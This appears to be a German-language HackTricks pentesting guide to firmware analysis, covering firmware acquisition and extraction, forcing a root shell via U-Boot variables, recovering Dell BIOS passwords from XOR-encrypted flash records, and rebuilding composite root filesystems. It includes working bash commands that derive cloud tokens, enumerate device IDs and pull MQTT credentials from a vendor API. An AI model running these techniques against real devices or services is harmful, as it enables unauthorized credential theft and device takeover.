# Firmware-Analyse

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Einführung**

### Verwandte Ressourcen

Informationen zum Auslesen über zugängliche Hardwareschnittstellen finden Sie unter [Firmware-Dumping mithilfe der UART-Konsole](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) und [SPI-Flash-Dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Für eine wiederholbare UART-Aufzeichnung während des Bootvorgangs, bevor der Zugriff auf die Konsole möglich ist, siehe [Stromversorgung und Oszilloskop-Erfassung über SCPI steuern](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist unverzichtbare Software, die den ordnungsgemäßen Betrieb von Geräten ermöglicht, indem sie die Kommunikation zwischen den Hardwarekomponenten und der Software verwaltet und erleichtert, mit der Benutzer interagieren. Sie wird in einem nichtflüchtigen Speicher abgelegt, sodass das Gerät vom Einschalten an auf wichtige Anweisungen zugreifen kann und anschließend das Betriebssystem startet. Die Untersuchung und mögliche Änderung der Firmware ist ein entscheidender Schritt, um Sicherheitslücken zu identifizieren.<sup>[[2]](#references)[[3]](#references)</sup>

## **Informationen sammeln**

Das **Sammeln von Informationen** ist ein entscheidender erster Schritt, um den Aufbau eines Geräts und die verwendeten Technologien zu verstehen. Dazu werden Daten zu folgenden Punkten erfasst:

- CPU-Architektur und Betriebssystem
- Details zum Bootloader
- Hardwareaufbau und Datenblätter
- Kennzahlen zur Codebasis und Speicherorte des Quellcodes
- Externe Bibliotheken und Lizenztypen
- Update-Verläufe und behördliche Zertifizierungen
- Architektur- und Ablaufdiagramme
- Sicherheitsbewertungen und erkannte Sicherheitslücken

Hierfür sind **Open-Source-Intelligence-Tools (OSINT)** unverzichtbar. Ebenso wichtig ist die Analyse verfügbarer Open-Source-Softwarekomponenten anhand manueller und automatisierter Prüfverfahren. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analysen, mit denen sich potenzielle Probleme finden lassen.

## **Firmware beschaffen**

Firmware kann auf verschiedene Arten beschafft werden, die jeweils unterschiedlich aufwendig sind:

- **Direkt** von der Quelle (Entwicklern, Herstellern)
- Durch **Erstellen** anhand der bereitgestellten Anweisungen
- Durch **Herunterladen** von offiziellen Support-Websites
- Mithilfe von **Google-dork**-Suchanfragen nach gehosteten Firmware-Dateien
- Durch direkten Zugriff auf **Cloud-Speicher**, etwa mit Tools wie [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Durch Abfangen von **Updates** mithilfe von Man-in-the-Middle-Techniken
- Durch **Extrahieren** vom Gerät über Verbindungen wie **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) oder **PICit**
- Durch **Mitscheiden** von Update-Anfragen in der Gerätekommunikation
- Durch Identifizieren und Verwenden von **fest codierten Update-Endpunkten**
- Durch **Dumpen** aus dem Bootloader oder über das Netzwerk
- Durch **Ausbauen und Auslesen** des Speicherchips, wenn alle anderen Möglichkeiten scheitern, unter Verwendung geeigneter Hardware-Tools

### Nur UART-Protokolle: Über die U-Boot-Umgebungsvariablen im Flash eine Root-Shell erzwingen

Wenn UART RX ignoriert wird (nur Protokolle), können Sie trotzdem eine Init-Shell erzwingen, indem Sie **den U-Boot-Umgebungsdatenblock offline bearbeiten**:<sup>[[6]](#references)</sup>

1. Den SPI-Flash mithilfe eines SOIC-8-Clips und eines Programmiergeräts auslesen (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Finde die U-Boot-env-Partition, bearbeite `bootargs`, sodass `init=/bin/sh` enthalten ist, und **berechne die U-Boot-env-CRC32 für den Blob neu**.
3. Schreibe nur die env-Partition neu und starte das Gerät neu; auf UART sollte eine Shell erscheinen.

Das ist bei Embedded-Geräten nützlich, bei denen die Bootloader-Shell deaktiviert ist, die env-Partition aber über externen Flash-Zugriff beschrieben werden kann.

### Geschützten Code über eine Firewall-Kopieraufgabe offenlegen

Bei manchen MCUs kann ungeschützter Anwendungscode eine Gateway-Funktion in einer geschützten Region aufrufen, statt geschützten Flash direkt auszulesen. Untersuche nach Erlangen der Codeausführung im Anwendungscode jede Gateway-Aufgabe als eigenständigen Speichertransfer-Primitive. Im Fall des Cypherock X1 akzeptierte das STM32L4-Firewall-Call-Gate eine Aufgabe, einen externen `data`-Pointer, eine Länge und eine geschützte `address`. Eine Schreibaufgabe wies einen `data`-Quellpointer in den Firewall Code nicht zurück. Der Aufrufer konnte diesen Code zwar nicht direkt lesen, aber das Gateway selbst konnte ihn in geschützten nichtflüchtigen Speicher kopieren, den eine zulässige Leseaufgabe zugänglich machte.<sup>[[15]](#references)</sup>

Um diese Art der Offenlegung nachzustellen, identifiziere eine beschreibbare geschützte Speicherseite mit einer entsprechenden Leseaufgabe, setze die Schreibquelle auf aufeinanderfolgende Adressen im geschützten Code und lies die zwischengespeicherten Bytes aus. Prüfe vor wiederholten Schreibvorgängen das Speichermedium: In diesem Fall war es Flash, daher musste eine Seite vor der Wiederverwendung gelöscht werden. Die Forscher verwendeten eine Routine, die den gültigen Inhalt von Secure Data Storage löschte und wiederherstellte, und legten den Code anschließend im verbleibenden freien Speicherplatz ab, statt Wallet-Daten zu überschreiben. Dafür sind Codeausführung auf der MCU und ein erreichbares Call-Gate erforderlich; es handelt sich nicht um einen direkten Lese-Bypass von einem nicht authentifizierten Host aus.<sup>[[15]](#references)</sup>

Der wiederhergestellte Code kann [Lücken beim Vertrauen in Firmware-Updates und Boot-Integrität](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata) offenlegen.<sup>[[15]](#references)</sup>

## Firmware analysieren

Da du jetzt **über die Firmware verfügst**, musst du Informationen darüber extrahieren, um zu wissen, wie du damit umgehen sollst. Dafür kannst du verschiedene Tools verwenden:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Wenn du mit diesen Tools nicht viel findest, überprüfe die **Entropie** des Images mit `binwalk -E <bin>`. Bei niedriger Entropie ist es wahrscheinlich nicht verschlüsselt. Bei hoher Entropie ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du mit diesen Tools **in die Firmware eingebettete Dateien** extrahieren:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder du kannst die Datei mit [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) untersuchen.

### Rohe Display-Assets im externen Flash

Ein externer SPI-Dump enthält nicht zwangsläufig die ausführbare Firmware des MCU. Vergleiche bei einem Cortex-M-Ziel den Anfang jedes möglichen Codebereichs mit der Speicherkarte des Geräts: Eine normale Vektortabelle beginnt mit einem plausiblen SRAM-Stackpointer und einer Reset-Handler-Adresse im ausführbaren Speicher. Eine fehlende Vektortabelle an Offset null beweist allein nicht, dass der gesamte Chip keinen Code enthält; untersuche weitere Offsets und die Boot-Anordnung. Wenn `binwalk` keinen Container findet, untersuche die Rohdaten und gleiche Flash-Leseadressen aus einer [dekodierten SPI-Aufzeichnung](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) mit Aktionen ab, die neue Bildschirme laden.<sup>[[14]](#references)</sup>

Versuche bei einem Display-Asset-Bereich verschiedene Pixelformate und Abmessungen, statt PNG/JPEG vorauszusetzen. Das zitierte Gerät verwendete Frames im Format **80×160 RGB565 little-endian**: Bei zwei Bytes pro Pixel ist ein Frame **25.600 Bytes** (25 KiB) groß, nicht 24 Kilobit. Eine dekodierte Flash-Leseadresse identifizierte den Offset des Bildschirm-Assets; der Forscher konvertierte ein vorbereitetes Bild mit `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, ersetzte das gleich große Asset im ursprünglichen Dump, schrieb es mit `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` und bestätigte das neue Bild auf dem Display. Dies demonstriert beschreibbare *externe Display-Assets*, nicht das Extrahieren oder erneute Flashen der internen Firmware des MCU. Bewahre den ursprünglichen Dump auf und überprüfe vor jedem Schreibvorgang die Abmessungen, Byte-Reihenfolge, den Offset und die Länge des Ersatzes.<sup>[[14]](#references)</sup>

### Differentielle Flash-Analyse und wiederherstellbare XOR-Secret-Stores

Wenn es für eine Firmware-Einstellung kein dokumentiertes Speicherformat gibt, lies zunächst den Flash mehrmals auf dieselbe Weise aus, ändere **genau eine** Einstellung, dump den gesamten Chip erneut und vergleiche die Offsets. Wiederhole das Experiment mit kontrollierten Werten, um die Einstellung von Zählern und Schreibmetadaten zu unterscheiden; Änderungen an neuen Offsets statt an Ort und Stelle weisen auf einen append-only oder log-structured Store hin. Behalte gelöschte beziehungsweise als gelöscht markierte Einträge bei, da deren Nutzdaten möglicherweise wiederherstellbar sind.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nachdem Sie die Region lokalisiert haben, extrahieren Sie die Firmware-Module mit Tools wie `binwalk` und analysieren Sie den Writer/Validator in Ghidra per Reverse Engineering. Bestätigen Sie Feldgrenzen, Padding, Schlüsselindizierung und Schlüsselableitung im Code, statt das Verfahren nur aus Chiffretextmustern abzuleiten.<sup>[[12]](#references)</sup>

#### Schlüssel aus verschlüsseltem Zero Padding wiederherstellen

Wie unter [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) beschrieben, gibt bekannter Klartext die Keystream-Bytes an denselben Offsets preis. Ein Feld fester Größe ist besonders anfällig, wenn sein Zero Padding jeden Index eines sich wiederholenden XOR-Schlüssels abdeckt: Das verschlüsselte Padding gibt diese Schlüsselbytes direkt preis, da `0x00 XOR key_byte = key_byte`. Wenn jeder Schlüsselindex abgedeckt ist, rekonstruieren Sie den Schlüssel aus dem Ende des Chiffretexts und entschlüsseln Sie die befüllten Bytes.<sup>[[12]](#references)</sup>

Das anfällige DVAR-BIOS-Passwortformat von Dell ist ein konkretes Beispiel: Byte `0` eines 32-Byte-Felds liegt im Klartext vor, während für die Bytes `1..31` ein sich wiederholender 20-Byte-Schlüssel verwendet wird.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Bei einer Passwortlänge `L` waren die Positionen `L..31` vor dem XOR auf null gesetzt. Wenn `L <= 12` gilt, decken diese Positionen jeden Schlüsselindex ab, sodass der vollständige Schlüssel und das Passwort ohne brute force wiederhergestellt werden:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Schlüssel aus historischen Datensätzen gewinnen

Analysiere nicht jeden Datensatz einzeln. Der DVAR-Schlüssel wird ungefähr so abgeleitet: `modified_md5(device_seed || variable_GUID || password[0])`. Der Device Seed und die GUID sind fest, und die einzige passwortabhängige Eingabe ist das Klartext-Byte am Anfang. Das ergibt höchstens 256 Schlüssel pro Gerät, sodass Datensätze, die mit demselben Byte beginnen, denselben Schlüssel verwenden. Gruppiere aktive und gelöschte Datensätze nach diesem Byte; ein kurzer historischer Datensatz kann durch Padding den vollständigen Schlüssel leaken und so einen aktuellen, längeren Datensatz entschlüsseln, dessen eigenes Padding nicht ausreicht. Eine Passwortrotation kann daher die Angriffsfläche vergrößern, wenn alte Chiffretexte tombstoned statt gelöscht werden.<sup>[[12]](#references)</sup>

Das Tool [`dellpwn`](https://github.com/R3n5k1/dellpwn) findet DVAR, validiert mögliche Datensätze, gewinnt Passwörter zurück und kann rohe gespeicherte Schlüssel- und Datenbytes anzeigen. Erstelle es aus einem Checkout und durchsuche ein verifiziertes Flash-Image wie folgt:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Für benutzerdefinierte Parser sollten False Positives anhand der Record-Struktur, Einschränkungen für druckbare Zeichen, Zero-Padding-Prüfungen, Schlüsselentropie und Konsistenz beim Umlauf des Schlüssels ausgeschlossen werden. Wenn wiederholte Dumps wenige Bit-Flips pro Schreibvorgang zeigen, sollten die beobachteten Masken aufgelistet und mögliche Korrekturen anhand dieser Einschränkungen eingestuft werden. Mehrdeutige Zeichen sollten jedoch als solche ausgewiesen werden, statt heuristische Ergebnisse als exakte Wiederherstellung darzustellen.<sup>[[12]](#references)</sup>

Passwortverifizierer sollten einen gesalzenen, iterierten Einweg-Hash statt reversiblen Chiffretext speichern, und logstrukturierte Speicher sollten veraltetes geheimes Material sicher entfernen.<sup>[[12]](#references)</sup>

### Dateisystem abrufen

Mit den zuvor kommentierten Tools wie `binwalk -ev <bin>` solltest du das **Dateisystem extrahiert** haben.\
Binwalk extrahiert es normalerweise in einen **Ordner mit dem Namen des Dateisystemtyps**, der meist einer der folgenden ist: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuelle Dateisystemextraktion

Manchmal hat binwalk das **Magic Byte des Dateisystems nicht in seinen Signaturen**. Verwende in diesen Fällen binwalk, um **den Offset des Dateisystems zu finden und das komprimierte Dateisystem aus der Binärdatei herauszuschneiden**, und **extrahiere** das Dateisystem anschließend anhand der folgenden Schritte manuell entsprechend seinem Typ.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Führe den folgenden **dd-Befehl** zum Carving des Squashfs-Dateisystems aus.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativ kann auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (wie im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Zusammengesetzte Embedded-Root-Dateisysteme rekonstruieren

Wenn ein Raw-Dump von eMMC/SSD einen gültigen Dateisystem-Header enthält, dessen Metadaten-Offsets aber über die nominale Partition hinausreichen, sollte er nicht sofort als beschädigt eingestuft werden. Eingebetteter Bootcode kann das echte Root-Gerät mithilfe von Device Mapper aus mehreren physischen Bereichen zusammensetzen. Daher enthält ein aus einer GPT-Partition extrahiertes Abbild nur das erste Segment.<sup>[[9]](#references)</sup>

#### Das vollständige Medienabbild prüfen

Vergewissere dich zunächst, dass die Erfassung abgeschlossen ist, die Größe stabil bleibt und kein Prozess das Abbild mehr beschreibt. Wenn der Dateiname eine Start-/Endadresse codiert, vergleiche diesen Bereich mit der tatsächlichen Bytegröße. Stelle die GPT im schreibgeschützten Modus wieder her und binde nur den erforderlichen Bereich ein. Führe **nicht** `vgchange -ay` auf der Workstation für ein nicht vertrauenswürdiges physisches Volume aus, da es zu Volume-Group-Kollisionen und unbeabsichtigten Schreibvorgängen kommen kann.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Verwende eine Wegwerf-VM, wenn die ursprüngliche Init-Logik oder ein LVM-Stack das gesamte Image sehen muss. Historische Boot-Logs einer standardmäßigen Boot-Partition sind besonders nützlich: Der Bootloader hat möglicherweise Offsets proprietärer Container, Komponentenlängen, Slot-Auswahl, Ausrichtungsregeln und Signaturprüfungen protokolliert. Verwende diese Werte, um eine eingebettete Befehlszeile, einen Kernel oder ein initramfs herauszulösen, und überprüfe dann jede Ausgabe unabhängig mit `file`, Magic Bytes und `binwalk`; das Lesen bis zum Ende des Containers kann versehentlich ein initrd, ein ACPI-Objekt oder eine Signatur an den Kernel anhängen.<sup>[[9]](#references)</sup>

#### Die Blockzuordnung zur Bootzeit ermitteln

Extrahiere das initramfs des Kernels und reverse-engineere dessen `/init` sowie alle Speicherbibliotheken. Folge unter [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) den String-Referenzen für `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` und Partitionspfade; verfolge anschließend den Code, der den aktiven A/B-Slot auswählt und die Tabelle erstellt. Nützliche Einstiegspunkte für radare2 sind `r2 -A init`, `afl`, `pdf @ main` und `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Das lineare Target ordnet aufeinanderfolgende Bereiche eines virtuellen Geräts Bereichen eines oder mehrerer zugrunde liegender Geräte zu. Eine rekonstruierte Tabelle mit zwei Segmenten hat häufig diese Form (alle Positionen und Längen sind 512-Byte-Sektoren):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduziere die Maschinenarithmetik exakt, einschließlich Integer-Breite, Verschiebungen und Einheitenumrechnungen. Der folgende Ausdruck rundet beispielsweise eine Byte-Größe auf eine 4-KiB-Grenze ab und rechnet sie erst danach in 512-Byte-Sektoren um; ersetzt man ihn durch `p4_bytes // 512`, verschiebt sich das ausgewählte Ende um `p4_bytes % 4096`, wenn die Partition nicht an einer Seitengrenze ausgerichtet ist.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Rekonstruiere ein flaches Analyse-Image, indem du die Bereiche in Tabellenreihenfolge mit begrenzten Datenblöcken kopierst, statt den vollständigen Media-Dump in den Speicher zu laden. Dadurch werden auch Mapper-Geräte auf dem Host vermieden. Behandle die aus GPT abgeleiteten Offsets, die umgekehrten Sektoranzahlen und die resultierende Ausgabelänge als separate Assertions.<sup>[[9]](#references)</sup>

#### Korruption von einem konstanten Rekonstruktionsfehler unterscheiden

Prüfe bei SquashFS die `hsqs`-Magic und dekodiere das little-endian 64-Bit-Feld `bytes_used` am Superblock-Offset 40, bevor du `unsquashfs` ausführst. Wenn die Extraktion bei mehreren voneinander unabhängigen Strukturen fehlschlägt, durchsuche ein breites Fenster um die erwarteten Positionen und verlange überzeugende strukturelle Kandidaten: einen dekomprimierbaren Metadatenblock, mehrere aufeinanderfolgende gültige Verzeichniseinträge, plausible Inode-Felder, einen Root-Inode, der mit der Inode-Anzahl übereinstimmt, oder eine gültige Integritätsmetadatenstruktur. Ein einzelner Magic-Treffer reicht nicht aus.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wenn dieselbe signierte Differenz unabhängige Strukturen gültig macht – zum Beispiel Verzeichnis-Metadaten und einen Verity-Datensatz –, ist wahrscheinlich ein systematischer Fehler beim Segmentstart die Ursache und nicht das Fehlen von Bytes. Kehre zur umgekehrten Berechnung zurück und suche nach verworfenen Resten, Vorzeichenbehandlung, Überläufen oder Rundungen auf Sektor- bzw. Seitengrenzen, bevor du versuchst, verwaiste Daten wiederherzustellen oder Dateisystem-Metadaten zu patchen.<sup>[[9]](#references)</sup>

Halte schließlich die Schutzgrenzen getrennt: TPM-versiegelte LUKS-Volumes schützen die Vertraulichkeit von Daten, während ein signiertes dm-verity-Mapping die Integrität des Root-Dateisystems schützt. Ein Software-TPM stellt keinen Schlüssel wieder her, der an das ursprüngliche physische TPM gebunden ist, und das Booten eines modifizierten SquashFS über ein ausschließlich zu Forschungszwecken verwendetes Init, das die Verity-Prüfung auslässt, fälscht weder dessen Signatur noch bricht es dm-verity.<sup>[[9]](#references)</sup>

## Firmware analysieren

Sobald die Firmware vorliegt, ist es wichtig, sie zu untersuchen, um ihre Struktur und potenzielle Schwachstellen zu verstehen. Dabei kommen verschiedene Tools zum Einsatz, um das Firmware-Image zu analysieren und wertvolle Daten daraus zu extrahieren.

### Erste Analysetools

Weitere Tools und Lektüre zur Firmware-Analyse findest du im [Firmware-Abschnitt von Third-Party Tools and Resources](../../generic-methodologies-and-resources/third-party-tools-and-resources.md#firmware).

Für die erste Untersuchung der Binärdatei (im Folgenden `<bin>` genannt) wird eine Reihe von Befehlen bereitgestellt. Diese helfen dabei, Dateitypen zu identifizieren, Strings zu extrahieren, Binärdaten zu analysieren und Details zu Partitionen und Dateisystemen zu ermitteln:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Um den Verschlüsselungsstatus des Abbilds zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` überprüft. Eine niedrige Entropie deutet auf fehlende Verschlüsselung hin, während eine hohe Entropie auf mögliche Verschlüsselung oder Komprimierung hinweist.

Zum Extrahieren **eingebetteter Dateien** werden Tools und Ressourcen wie die Dokumentation **file-data-carving-recovery-tools** und **binvis.io** zur Dateiprüfung empfohlen.

### Dateisystem extrahieren

Mit `binwalk -ev <bin>` lässt sich das Dateisystem üblicherweise extrahieren, oft in ein Verzeichnis, das nach dem Dateisystemtyp benannt ist (z. B. squashfs, ubifs). Wenn **binwalk** den Dateisystemtyp aufgrund fehlender Magic Bytes jedoch nicht erkennt, ist eine manuelle Extraktion erforderlich. Dazu wird mit `binwalk` der Offset des Dateisystems ermittelt und anschließend mit dem Befehl `dd` das Dateisystem herausgeschnitten:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Anschließend werden je nach Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) verschiedene Befehle verwendet, um den Inhalt manuell zu extrahieren.

### Dateisystemanalyse

Nachdem das Dateisystem extrahiert wurde, beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere Netzwerk-Daemons, fest codierte Zugangsdaten, API-Endpunkte, Funktionen des Update-Servers, nicht kompilierten Code, Startskripte und kompilierte Binärdateien für die Offline-Analyse geachtet.

Zu den **wichtigen Orten** und **Elementen**, die untersucht werden sollten, gehören:

- **etc/shadow** und **etc/passwd** auf Benutzerzugangsdaten
- SSL-Zertifikate und Schlüssel in **etc/ssl**
- Konfigurations- und Skriptdateien auf mögliche Schwachstellen
- Eingebettete Binärdateien für weitere Analysen
- Gängige Webserver und Binärdateien von IoT-Geräten

Mehrere Tools helfen dabei, vertrauliche Informationen und Schwachstellen im Dateisystem aufzudecken:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) zum Durchsuchen nach vertraulichen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für umfassende Firmware-Analysen
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analysen

### Sicherheitsprüfungen kompilierter Binärdateien

Sowohl der im Dateisystem gefundene Quellcode als auch die kompilierten Binärdateien müssen auf Schwachstellen untersucht werden. Tools wie **checksec.sh** für Unix-Binärdateien und **PESecurity** für Windows-Binärdateien helfen dabei, ungeschützte Binärdateien zu identifizieren, die ausgenutzt werden könnten.

## Cloud-Konfiguration und MQTT-Zugangsdaten über abgeleitete URL-Tokens abgreifen

Viele IoT-Hubs rufen ihre gerätespezifische Konfiguration von einem Cloud-Endpunkt ab, der etwa so aussieht:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Bei der Firmware-Analyse findest du möglicherweise heraus, dass `<token>` lokal anhand der Geräte-ID und eines fest codierten geheimen Schlüssels abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) und als Hexadezimalzahl in Großbuchstaben dargestellt

Dieses Design ermöglicht es jedem, der eine deviceId und den STATIC_KEY kennt, die URL zu rekonstruieren und die Cloud-Konfiguration abzurufen, wodurch häufig MQTT-Zugangsdaten im Klartext und Topic-Präfixe offengelegt werden.

Praktischer Ablauf:

1) deviceId aus UART-Bootprotokollen extrahieren

- Einen 3.3V-UART-Adapter (TX/RX/GND) anschließen und die Protokolle aufzeichnen:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Suche nach Zeilen, die das Cloud-Konfigurations-URL-Muster und die Broker-Adresse ausgeben, zum Beispiel:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) STATIC_KEY und Token-Algorithmus aus der Firmware extrahieren

- Binärdateien in Ghidra/radare2 laden und nach dem Konfigurationspfad ("/pf/") oder der Verwendung von MD5 suchen.
- Den Algorithmus bestätigen (z. B. MD5(deviceId||STATIC_KEY)).
- Das Token in Bash ableiten und den Digest in Großbuchstaben umwandeln:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud-Konfiguration und MQTT-Anmeldedaten abgreifen

- URL zusammenstellen und JSON mit curl abrufen; mit jq analysieren, um Geheimnisse zu extrahieren:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Klartext-MQTT und schwache Topic-ACLs ausnutzen (falls vorhanden)

- Verwende wiederhergestellte Zugangsdaten, um Maintenance-Topics zu abonnieren und nach sensiblen Ereignissen zu suchen:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Vorhersehbare Geräte-IDs aufzählen (im großen Maßstab und mit Genehmigung)

- Viele Ökosysteme betten Hersteller-OUI-/Produkt-/Typ-Bytes ein, gefolgt von einem sequenziellen Suffix.
- Du kannst mögliche IDs durchiterieren, Tokens ableiten und Konfigurationen programmgesteuert abrufen:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Hinweise
- Hole immer eine ausdrückliche Genehmigung ein, bevor du mit einer Massenerfassung beginnst.
- Bevorzuge nach Möglichkeit Emulation oder statische Analyse, um Geheimnisse wiederherzustellen, ohne die Zielhardware zu verändern.


Die Emulation von Firmware ermöglicht eine **dynamische Analyse** des Betriebs eines Geräts oder eines einzelnen Programms. Bei diesem Ansatz können Herausforderungen durch Hardware- oder Architekturabhängigkeiten auftreten. Das Übertragen des Root-Dateisystems oder bestimmter Binärdateien auf ein Gerät mit passender Architektur und Endianness, beispielsweise einen Raspberry Pi, oder auf eine vorgefertigte virtuelle Maschine kann jedoch weitere Tests erleichtern.

### Einzelne Binärdateien emulieren

Bei der Untersuchung einzelner Programme ist es entscheidend, die Endianness und CPU-Architektur des Programms zu ermitteln.

#### Beispiel mit MIPS-Architektur

Um eine Binärdatei mit MIPS-Architektur zu emulieren, kann folgender Befehl verwendet werden:

```bash
file ./squashfs-root/bin/busybox
```

Und um die erforderlichen Emulationstools zu installieren:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Für MIPS (Big-Endian) wird `qemu-mips` verwendet, für Little-Endian-Binärdateien eignet sich `qemu-mipsel`.

#### Emulation der ARM-Architektur

